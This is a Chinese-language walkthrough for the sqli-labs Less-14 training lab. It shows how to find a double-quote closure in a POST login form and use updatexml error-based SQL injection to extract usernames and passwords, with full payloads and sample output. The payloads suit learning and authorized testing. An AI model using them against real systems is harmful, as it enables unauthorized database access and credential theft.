# Less-14 双引号闭合报错注入复现

### Less-14 双引号闭合报错注入复现步骤 ✅

Less-14 是 **POST 型双引号闭合**的报错注入，核心思路是利用 `updatexml` 函数的报错特性，将查询结果“挤”到报错信息中。

---

#### 1. 环境与闭合方式确认

- 访问地址：`http://127.0.0.1/sqli-labs/Less-14/`

- 原 SQL 逻辑（推测）：

    ```SQL
    
    SELECT * FROM users WHERE username="$uname" AND password="$passwd" LIMIT 0,1
    ```

- 闭合测试：

发送 POST 数据：

```Plain Text

uname=admin"&passwd=123456&submit=Submit
```

报错信息会提示语法错误在 `'123456" LIMIT 0,1'` 附近，说明闭合符是双引号 `"`。

---

#### 2. 报错注入 Payload 构造

利用 `updatexml` 函数触发报错，提取数据：

```Plain Text

uname=" or updatexml(1,concat(0x7e,(select concat(username,':',password) from users limit 0,1)),1)#
&passwd=admin
&submit=Submit
```

**Payload 拆解**：

- `"`：闭合前面的双引号，使后续语句生效

- `or`：构造恒真条件，绕过登录验证

- `updatexml(1, ... ,1)`：触发 XPATH 语法错误，将查询结果暴露在报错中

- `concat(0x7e, ...)`：用 `~`（0x7e）分隔报错信息与查询结果，便于识别

- `#`：注释掉后续 SQL 语句（如 `AND password='...'`）

---

#### 3. 执行与结果提取

1. 用 HackBar（或 Burp Suite）发送 POST 请求：

    - 勾选 `Use POST method`

    - Body 填写上述 Payload

    - 执行后，页面会返回报错信息，其中包含查询到的用户名和密码，例如：

        ```Plain Text
        
        XPATH syntax error: '~Dumb:Dumb'
        ```

2. 提取报错信息中的 `~` 后的内容，即为第一条用户记录的用户名和密码（如 `Dumb:Dumb`）。

---

#### 4. 扩展：查询更多数据

- 查询第二条记录：

    ```Plain Text
    
    uname=" or updatexml(1,concat(0x7e,(select concat(username,':',password) from users limit 1,1)),1)#
    &passwd=admin
    &submit=Submit
    ```

- 也可使用 `extractvalue` 函数，原理与 `updatexml` 类似。

---

### 关键注意事项

- 确保 MySQL 版本支持 `updatexml` 函数（MySQL 5.1+ 支持）

- 若报错信息被过滤，可尝试调整报错函数或编码方式

- 测试时建议在本地靶场（如 sqli-labs）进行，避免非法攻击
> （注：文档部分内容可能由 AI 生成）